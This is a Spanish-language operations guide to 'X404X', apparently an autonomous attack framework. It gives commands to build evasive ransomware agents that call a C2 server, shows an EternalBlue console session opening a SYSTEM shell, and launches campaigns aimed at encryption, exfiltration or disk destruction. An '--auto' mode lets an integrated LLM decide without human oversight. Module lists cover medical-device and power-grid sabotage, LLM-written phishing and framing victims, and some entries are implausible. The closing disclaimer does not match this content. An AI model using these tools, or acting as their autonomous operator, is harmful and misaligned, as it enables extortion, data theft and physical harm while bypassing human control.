# X404X — Guía Operacional Completa

> Plataforma autónoma de Red Team con 154+ módulos, IA integrada (Specter/Apex), y orquestación POMDP.
> Build: 26.6MB ELF x86-64 · Go 1.25 · Python 3.14

---

## 1. Arranque Rápido

### Iniciar el Dashboard (API + WebSocket + UI)

```bash
./x404x dashboard
```

Esto levanta:
- API REST en `https://localhost:8443`
- WebSocket en puerto `8446` (configurado en `config.yaml` → `server.ws_port`)
- Frontend Vue3 en `http://localhost:3000` (si `dashboard.enabled: true`)
- gRPC AgentService en puerto `8444`

El servidor escucha en `0.0.0.0` por defecto. Para cambiar el puerto o habilitar TLS automático, editar `config.yaml`:

```yaml
server:
  host: "0.0.0.0"
  port: 8443
  enable_tls: true
  auto_cert: true

dashboard:
  enabled: true
  port: 3000
```

### Iniciar la Consola Interactiva (msfconsole-style)

```bash
./x404x console
```

Abre un shell interactivo con autocompletado, historial, y acceso a todos los módulos. Prompt:

```
x404x > 
```

### Iniciar el Laboratorio Docker

```bash
make lab-up
```

Levanta 5 contenedores Docker con red aislada `172.20.0.0/24`:
- `x404x-attacker` (172.20.0.10) — Nodo atacante con framework completo
- `x404x-target1` — Objetivo Linux vulnerable
- `x404x-target2` — Objetivo Windows (Wine)
- `x404x-target3` — Servidor web vulnerable
- `x404x-dashboard` — Dashboard en localhost:3000

---

## 2. Generar un Payload Ransomware

### Comando Básico

```bash
x404x payload generate --os windows --arch amd64 --c2 10.0.0.1:8443 --evasion stealth
```

### Salida

El binario compilado se genera en:

```
dist/agent-windows-amd64.exe
```

El payload incluye:
- Comunicación cifrada con XChaCha20-Poly1305 + X25519 key exchange
- Heartbeat configurable (default 30s)
- Kill switch integrado (código: `EMERGENCY_STOP`)
- Auto-destrucción tras 2 horas (`safety.auto_destruct_hours`)

### Flag `--evasion`

| Nivel | Técnicas Aplicadas |
|-------|-------------------|
| `none` | Sin ofuscación, binario limpio |
| `basic` | XOR strings + strip symbols |
| `stealth` | Polimorfismo + packer UPX + AMSI bypass + ETW patch |
| `paranoid` | Todo lo anterior + sleep jitter + indirect syscalls + sandbox detection |

El nivel `stealth` aplica:
1. **Polimorfismo**: Cada build genera un hash único (mutación de código muerto)
2. **Packer**: Compresión UPX con stub personalizado
3. **AMSI Bypass**: Patchea AmsiScanBuffer en runtime
4. **ETW Patch**: Deshabilita Event Tracing for Windows

### Plataformas Soportadas

| OS | Arquitecturas |
|----|---------------|
| windows | amd64, arm64 |
| linux | amd64, arm64 |
| darwin | amd64, arm64 |

---

## 3. Ejecutar una Campaña

### Crear y Lanzar Campaña

```bash
x404x campaign start --name demo --target 10.0.0.0/24 --goal exfil_encrypt --profile aggressive --auto
```

| Flag | Descripción |
|------|-------------|
| `--name` | Identificador de la campaña |
| `--target` | Rango IP objetivo (CIDR) |
| `--goal` | Objetivo final: `domain_admin`, `exfil_encrypt`, `persistence`, `destruction` |
| `--profile` | Perfil de velocidad: `stealth`, `balanced`, `aggressive` |
| `--auto` | Modo autónomo — la IA toma decisiones sin intervención |

### Fases del Kill Chain

La campaña recorre automáticamente 7 fases:

#### Fase 1: Reconocimiento (Recon)
- Escaneo TCP/UDP del rango objetivo
- OSINT pasivo (DNS, subdominios, certificados)
- Fingerprinting de servicios y versiones
- Detección de vulnerabilidades conocidas

#### Fase 2: Armamento (Weaponization)
- Selección automática de exploits según vulnerabilidades detectadas
- Generación de payload adaptado al SO/arquitectura del target
- Aplicación del nivel de evasión configurado en el perfil

#### Fase 3: Entrega (Delivery)
- Vector seleccionado por la IA: phishing, exploit directo, supply chain
- Si el perfil es `aggressive`: entrega directa por red
- Si el perfil es `stealth`: phishing con LLM o supply chain

#### Fase 4: Explotación (Exploitation)
- Ejecución del exploit seleccionado
- Escalación de privilegios automática (SUID, sudo, kernel)
- Bypass de defensas (AMSI, ETW, EDR)

#### Fase 5: Instalación (Installation)
- Persistencia según SO: cron, systemd, registry, bootkit
- Despliegue del agente en el host comprometido
- Registro con el C2 server

#### Fase 6: Comando y Control (C2)
- Agente establece canal cifrado con el servidor
- Heartbeat periódico con jitter aleatorio
- Canales disponibles: TCP, HTTP/S, DNS, ICMP, SMB, WebSocket, DoH

#### Fase 7: Acciones sobre el Objetivo (Actions on Objective)
- Según `--goal`:
  - `exfil_encrypt`: Exfiltración de datos sensibles → Cifrado de archivos → Nota de rescate
  - `domain_admin`: Movimiento lateral → Kerberoast → Golden Ticket
  - `persistence`: Implantes múltiples + backup C2
  - `destruction`: Wipe de discos + firmware corruption

### Verificar Estado

```bash
x404x campaign status
```

Salida ejemplo:

```
Campaign: demo
Status:   ACTIVE (Phase 4/7 — Exploitation)
Target:   10.0.0.0/24
Hosts:    24 discovered, 8 compromised, 3 active agents
Goal:     exfil_encrypt (42% complete)
Profile:  aggressive
Duration: 00:14:32
```

### Otros Comandos de Campaña

```bash
x404x campaign list                    # Listar todas las campañas
x404x campaign pause <campaign_id>     # Pausar campaña activa
x404x campaign resume <campaign_id>    # Reanudar campaña pausada
```

---

## 4. Usar la Consola (msfconsole-style)

### Iniciar

```bash
./x404x console
```

### Flujo de Trabajo Típico

```
x404x > use exploit/eternalblue
[*] Module: exploit/eternalblue (MS17-010 EternalBlue SMB RCE)

x404x (exploit/eternalblue) > set RHOSTS 10.0.0.10
RHOSTS => 10.0.0.10

x404x (exploit/eternalblue) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp

x404x (exploit/eternalblue) > exploit
[*] Sending exploit to 10.0.0.10:445...
[+] Shell opened — session 1

x404x (exploit/eternalblue) > sessions
  ID  Type       Target        Status    Duration
  1   shell      10.0.0.10     active    00:02:14
  2   meterp     10.0.0.15     active    00:08:42

x404x (exploit/eternalblue) > sessions -i 1
[*] Interacting with session 1...

session 1 (10.0.0.10) > whoami
nt authority\system
```

### Comandos de Consola

| Comando | Descripción |
|---------|-------------|
| `use <module>` | Cargar un módulo |
| `set <var> <value>` | Configurar variable del módulo |
| `exploit` / `run` | Ejecutar módulo cargado |
| `sessions` | Listar sesiones activas |
| `sessions -i <id>` | Interactuar con sesión |
| `search <term>` | Buscar módulos por nombre/descripción |
| `info` | Información detallada del módulo cargado |
| `options` | Mostrar opciones configurables |
| `back` | Salir del módulo actual |
| `help` | Mostrar ayuda |
| `exit` | Salir de la consola |

### Buscar Módulos

```
x404x > search ransomware
  #   Module                          Description
  1   ransomware/hope_trap            Partial decrypt trap + forensic monitor
  2   ransomware/identity_destroy     Browser session theft + account hijack
  3   ransomware/worm                 Multi-platform worm Win/Linux/macOS/IoT
  4   ransomware/supply_chain         Updater + NuGet/pip/npm/git poisoning
  5   ransomware/cloud_exploit        AWS/Azure/GCP creds + instances
  ...
```

---

## 5. Dashboard Web

Acceder en `http://localhost:3000` (o el puerto configurado en `dashboard.port`).

### Pestañas

| Pestaña | Función |
|---------|---------|
| **Dashboard** | Visualización del Kill Chain en tiempo real. Muestra la fase actual, progreso de la campaña, y un feed en vivo de eventos (agentes conectados, exploits lanzados, archivos cifrados). Diagrama interactivo de Lockheed Martin Cyber Kill Chain. |
| **Agents** | Flota de agentes desplegados. Tabla con ID, hostname, SO, IP, último heartbeat, estado (online/dead/dormant). Permite interactuar, enviar tareas, o eliminar agentes. |
| **Recon** | Mapa de red generado tras el escaneo. Nodos representan hosts, colores indican estado (vulnerable/comprometido/limpio). Topología de red con puertos abiertos y servicios. |
| **AI** | Chat con Specter (LLM integrado vía Ollama). Permite hacer preguntas sobre la campaña, pedir sugerencias tácticas, o activar modo autónomo. Modelo configurable en `config.yaml` → `ai.model`. |
| **Terminal** | CLI embebida en el navegador. Equivalente a `./x404x console` pero accesible desde la interfaz web. Soporta todos los comandos. |
| **Metrics** | Panel de detección BlueForge. Muestra qué acciones fueron detectadas por el módulo de defensa simulada, score de evasión, y recomendaciones para reducir la huella. Reportes en `reports/blue_metrics.json`. |

---

## 6. Módulos Disponibles

### Categorías Principales

#### Ransomware (v2.4 — 16 módulos)
| Módulo | Función |
|--------|---------|
| `ransomware/hope_trap` | Trampa de descifrado parcial con monitor forense |
| `ransomware/identity_destroy` | Robo de sesiones de navegador + hijack de cuentas |
| `ransomware/worm` | Gusano multiplataforma Win/Linux/macOS/IoT |
| `ransomware/supply_chain` | Envenenamiento de updaters + paquetes (NuGet/pip/npm/git) |
| `ransomware/cloud_exploit` | Explotación de credenciales AWS/Azure/GCP |
| `ransomware/bluetooth_prop` | Propagación por BlueBorne/BLE/WiFi Direct |
| `ransomware/iot_botnet` | Botnet IoT con DDoS |
| `ransomware/scada_attack` | Ataques Modbus/S7/CIP a PLCs |
| `ransomware/hardware_kill` | Sobrevoltaje/kill de ventiladores/corrupción BIOS |
| `ransomware/network_poison` | ARP spoof + MITM + portal cautivo |
| `ransomware/dna_mutation` | Hibridación genética de DLLs |
| `ransomware/bootkit` | Persistencia MBR/GPT |
| `ransomware/blockchain_c2` | C2 via Bitcoin OP_RETURN |
| `ransomware/fake_decryptor` | Descifrador falso que destruye claves |
| `ransomware/raas_inverse` | Panel RaaS inverso multi-atacante |
| `ransomware/survivor_game` | Competencia entre empleados |

#### v2.6: POMDPs + IA + Evasión + Cloud (15 módulos)
| Módulo | Función |
|--------|---------|
| `v26/pomdp` | Orquestador POMDPs + God of Chaos |
| `v26/ai_negotiation` | Negociación IA con plantillas LLM |
| `v26/evasion_deep` | Syscalls indirectas + AMSI/ETW + Hardware Breakpoints |
| `v26/bootkit_smm` | UEFI + SMM bootkit |
| `v26/mobile_x` | Agentes Android/iOS + hijack MDM |
| `v26/cloud_nemesis` | AWS privesc + Lambda C2 serverless |
| `v26/social_c2` | C2 via Twitter/Reddit + túnel DoH |
| `omega/backup_parasite` | Infectar backups ZIP/VHD/VMDK |
| `omega/integrity_attack` | Corrupción de checksums Tripwire/AIDE |
| `omega/av_whitelist` | Inyección de exclusiones AV |
| `omega/multi_generational` | Trampa de rescate aniversario 3 años |
| `omega/hvac_attack` | Sobrecalentamiento de salas via Modbus |
| `omega/amt_implant` | Backdoor firmware Intel AMT/AMD PSP |
| `omega/satcom_hijack` | Flash firmware SATCOM + redirección |

#### v2.7: Control Total + Phishing (10 módulos)
| Módulo | Función |
|--------|---------|
| `v27/uefi_bootkit` | SPI flash DXE driver + NVRAM |
| `v27/hypervisor_ring1` | Ring -1 Blue Pill/Vitriol |
| `v27/pcie_rootkit` | GPU VRAM + NIC firmware DMA |
| `v27/kernel_instrument` | eBPF syscall + ETW + BYOVD |
| `v27/secure_boot_bypass` | Shim + MOK + GRUB compromise |
| `v27/phishing_infra` | DGA + Caddy + CF Workers + SOCKS5 |
| `v27/spear_phish_ai` | Ollama LLM + fake M365/Google |
| `v27/anti_phish_evasion` | Tokens + Safe Links bypass |
| `v27/smishing_sms` | Twilio/Vonage + SS7 2FA |
| `v27/vishing_voice` | Clonación de voz + llamadas Twilio |

#### v2.8: Arsenal de Malicia Ultimate (24 módulos)
| Módulo | Función |
|--------|---------|
| `v28/iot_identity_theft` | Robo de certificados X.509 IoT |
| `v28/false_memory` | Forjar evidencia en Teams/Slack/email |
| `v28/thousand_cuts` | Degradación de servicios en 90 días |
| `v28/patchguard_bypass` | KeBugCheckEx hook + DKOM |
| `v28/keyboard_led` | Exfiltración Morse por LEDs (air-gap) |
| `v28/zombie_army` | Campaña de difamación en redes sociales |
| `v28/legacy_poison` | Inculpar a la víctima de actividades ilegales |
| `v28/seo_sabotage` | Sabotaje SEO black-hat |
| `v28/fake_vulns` | Vulnerabilidades trampa en repos |
| `v28/inception_hv` | Hypervisor anidado matrioska |
| `v28/isp_bgp` | Hijack BGP a escala Internet |
| `v28/anti_attribution` | Clonación de identidad para incriminar |
| `v28/power_grid_harmonics` | Destrucción resonante de transformadores |
| `v28/time_lock` | Ventana de 30 min o destrucción de claves |
| `v28/vr_spyware` | Spyware VR + mensajes subliminales |
| `v28/global_ai_poison` | Backdoor en HuggingFace/Kaggle/OpenML |
| `v28/cdn_injection` | Hijack Cloudflare/Akamai/Fastly |
| `v28/bio_cyber_dna` | Alteración de órdenes de ADN sintético |
| `v28/browser_parasite` | Extensión de navegador parásita oculta |
| `v28/fake_documents` | Falsificación de órdenes de compra/resoluciones |
| `v28/sound_panic` | Alarma de incendio/evacuación por altavoces IP |
| `v28/emotional_encrypt` | Cifrado de archivos sentimentales |
| `v28/false_redemption` | Descifrador falso + backdoor permanente |

#### v2.9: Destrucción Hardware + Stealth (27 módulos)
| Módulo | Función |
|--------|---------|
| `v29/hdd_firmware_destroy` | Corrupción firmware HDD + brick |
| `v29/vrm_overvoltage` | Sobrevoltaje VRM CPU/GPU |
| `v29/acoustic_resonance` | Resonancia acústica platos HDD |
| `v29/psu_corrupt` | Sobrecarga firmware PSU |
| `v29/usb_killer` | Descarga eléctrica USB |
| `v29/robot_sabotage` | Inyección de comandos a robots industriales |
| `v29/centrifuge_resonance` | Resonancia de centrífugas (clase Stuxnet) |
| `v29/ui_shell_fake` | Overlay de shell OS falso |
| `v29/deepfake_hallucinate` | Inyección de alucinaciones en LLMs |
| `v29/network_ghosts` | Hosts fantasma en segmentos de red |
| `v29/medical_tamper` | Manipulación de calibración médica |
| `v29/intel_me_flash` | Backdoor firmware Intel ME |
| `v29/smm_handler` | Implante handler SMM |
| `v29/microcode_corrupt` | Corrupción de microcode CPU |
| `v29/nic_persist` | Persistencia en firmware NIC |
| `v29/mft_bitmap` | Corrupción bitmap MFT NTFS |
| `v29/backup_prune` | Poda silenciosa de rotación de backups |
| `v29/journal_poison` | Envenenamiento de journal filesystem |
| `v29/dns_poison` | Envenenamiento cache DNS recursivo |
| `v29/bgp_phantom` | Inyección rutas fantasma BGP |
| `v29/ldap_intermittent` | Fallos intermitentes auth LDAP |
| `v29/digital_thermite` | Destrucción de datos multicapa |
| `v29/honey_token` | Despliegue + tracking de honey tokens |
| `v29/access_log_wipe` | Sanitización selectiva de logs |
| `v29/tpm_unseal` | Unseal TPM + extracción de claves |
| `v29/dram_rowhammer` | Privesc via bit-flip DRAM Rowhammer |
| `v29/supply_chain_hw` | Interdicción supply chain hardware |

#### v2.10: Endgame (2 módulos)
| Módulo | Función |
|--------|---------|
| `v210/apocalipsis` | Secuencia de aniquilación total de infraestructura |
| `v210/phantom_evasion` | Eliminación total de huellas forenses |

#### Block Z: El Umbral de la Perdición (14 módulos)
| Módulo | Función |
|--------|---------|
| `blockz/genetic_evolve` | Breeding darwiniano de malware |
| `blockz/deepfake` | Suplantación CEO con ONNX face+voice |
| `blockz/scada_covert` | Sabotaje gradual de parámetros |
| `blockz/firmware_worm` | Gusano firmware router/switch/firewall |
| `blockz/medical_attack` | CVEs pacemaker/insulina/neuroestimulador |
| `blockz/model_poison` | Backdoor poisoning de modelos IA |
| `blockz/disinformation` | Sabotaje Email/Slack/calendar |
| `blockz/airgap_jump` | Exfiltración ultrasonido + LED óptico |
| `blockz/post_quantum` | Kyber-1024 + AES-256-GCM |
| `blockz/deadman` | Apocalipsis autónomo 48h |
| `blockz/falseflag` | Framing APT Lazarus/APT29/APT41 |
| `blockz/edr_kill` | Silenciar 10 EDRs + auto-despliegue |
| `blockz/financial` | Cosecha insider + opciones put |
| `blockz/iot_chain` | Cascada hospital/fábrica/red eléctrica |

---

## 7. Modo Laboratorio

### Arquitectura del Lab

El laboratorio Docker proporciona un entorno aislado para pruebas sin riesgo.

### Iniciar

```bash
make lab-up
```

Salida:

```
[*] Starting Docker lab...
[+] Lab running at:
    Attacker:  docker exec -it x404x-attacker bash
    Target 1:  docker exec -it x404x-target1 bash
    Dashboard: http://localhost:3000
```

### Contenedores

| Contenedor | IP | Descripción |
|------------|-----|-------------|
| `x404x-attacker` | 172.20.0.10 | Nodo atacante con framework completo |
| `x404x-target1` | 172.20.0.20 | Linux vulnerable (SSH, Apache, Redis) |
| `x404x-target2` | 172.20.0.21 | Windows simulado (Samba, SMB) |
| `x404x-target3` | 172.20.0.22 | Web app vulnerable (Log4j, path traversal) |
| `x404x-dashboard` | 172.20.0.100 | Dashboard Vue3 |

### Entrar al Atacante

```bash
docker exec -it x404x-attacker bash
```

Dentro del contenedor, el framework está disponible:

```bash
./x404x console
./x404x campaign start --name lab-test --target 172.20.0.0/24 --goal domain_admin --profile aggressive --auto
```

### Dashboard del Lab

Accesible en `http://localhost:3000`. La autenticación está deshabilitada en modo lab (`dashboard.auth_token: ""`).

### Detener

```bash
make lab-down
```

### Escenarios Disponibles

```bash
x404x lab up --scenario ctf_basic        # CTF básico con 5 targets
x404x lab up --scenario ad_environment   # Simulación Active Directory
x404x lab up --scenario webapp_pentest   # Testing de aplicaciones web
x404x lab up --scenario full_chain       # Ejercicio kill chain completo
```

---

## 8. Webhooks y Notificaciones

### Configuración

Editar la sección `notifications` en `config.yaml`:

```yaml
notifications:
  enabled: true
  slack_webhook: "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
  discord_webhook: "https://discord.com/api/webhooks/YOUR/WEBHOOK/URL"
  telegram_bot_token: "YOUR_BOT_TOKEN"
  telegram_chat_id: "YOUR_CHAT_ID"
  events: ["campaign_started", "campaign_completed", "agent_detected", "blue_team_alert"]
```

### Eventos Disponibles

| Evento | Descripción |
|--------|-------------|
| `campaign_started` | Se inicia una nueva campaña |
| `campaign_completed` | Campaña finaliza (éxito o fallo) |
| `agent_detected` | Un agente fue detectado por defensas |
| `agent_connected` | Nuevo agente se registra en C2 |
| `blue_team_alert` | El módulo BlueForge detecta actividad |
| `exploit_success` | Un exploit se ejecuta exitosamente |
| `phase_transition` | La campaña avanza de fase |

### Slack

1. Crear un Incoming Webhook en la app de Slack
2. Copiar la URL del webhook en `slack_webhook`
3. Las notificaciones llegan como mensajes con formato rich (campos de campaña, target, fase)

### Discord

1. En el canal deseado → Ajustes → Integraciones → Webhooks → Nuevo Webhook
2. Copiar la URL en `discord_webhook`
3. Formato embed con colores según severidad

### Telegram

1. Crear bot con @BotFather → obtener token
2. Obtener `chat_id` del grupo/canal
3. Los mensajes incluyen markdown con detalles del evento

---

## 9. Solución de Problemas

### Dashboard devuelve 404

**Causa**: La API Go no está corriendo en el puerto 8443.

**Solución**:
```bash
# Verificar que el proceso está activo
ps aux | grep x404x

# Verificar puertos en uso
ss -tlnp | grep 8443

# Reiniciar
./x404x dashboard
```

Asegurarse que `server.port: 8443` en `config.yaml` coincide con el puerto esperado.

### Python Bridge no conecta

**Causa**: El servicio Python (módulos en `modules/`) no escucha en el puerto 9100.

**Solución**:
```bash
# Verificar dependencias Python
pip install -r requirements.txt

# Verificar que el puerto 9100 no está ocupado
ss -tlnp | grep 9100

# Reiniciar manualmente
python modules/bridge.py --port 9100
```

### Payload no compila

**Causa**: Versión de Go insuficiente.

**Solución**:
```bash
# Verificar versión de Go (requiere 1.22+)
go version

# Si la versión es inferior, actualizar
# Para Ubuntu/Debian:
sudo rm -rf /usr/local/go
wget https://go.dev/dl/go1.25.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.25.0.linux-amd64.tar.gz
```

### Agente no conecta al C2

**Causa**: Mismatch entre la dirección C2 del payload y el servidor.

**Solución**:
```bash
# Verificar config del servidor
grep -A2 "server:" config.yaml

# El flag --c2 al generar el payload debe coincidir con server.host:server.port
x404x payload generate --os linux --arch amd64 --c2 <TU_IP>:8443
```

### Base de datos bloqueada

**Causa**: SQLite no soporta escrituras concurrentes.

**Solución**:
```bash
# Verificar estado de la DB
x404x db status

# Si está corrupta, restaurar desde backup
x404x db restore backups/x404x.db.bak

# O migrar de nuevo
x404x db migrate --up
```

### Lab Docker no inicia

**Causa**: Docker no instalado o docker-compose no disponible.

**Solución**:
```bash
# Verificar Docker
docker --version
docker compose version

# Si no está disponible, instalar
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker $USER
```

### Ollama/IA no responde

**Causa**: Servicio Ollama no corriendo o modelo no descargado.

**Solución**:
```bash
# Verificar que Ollama está corriendo
curl http://localhost:11434/api/tags

# Descargar el modelo configurado
ollama pull llama3.2

# Verificar config
grep -A4 "ai:" config.yaml
```

---

## Notas de Seguridad

- **Kill Switch**: Siempre activo por defecto. Enviar `EMERGENCY_STOP` detiene todos los agentes.
- **Geofence**: Activado por defecto. Los agentes verifican ubicación antes de actuar.
- **Max Infections**: Límite de 1000 hosts por defecto (`safety.max_infections`).
- **Auto-destrucción**: Los agentes se eliminan tras 2 horas sin contacto con C2.
- **No Persistence**: Activado por defecto en modo seguro — los agentes no persisten tras reboot.

Este framework es exclusivamente para uso educativo y pruebas de penetración autorizadas.
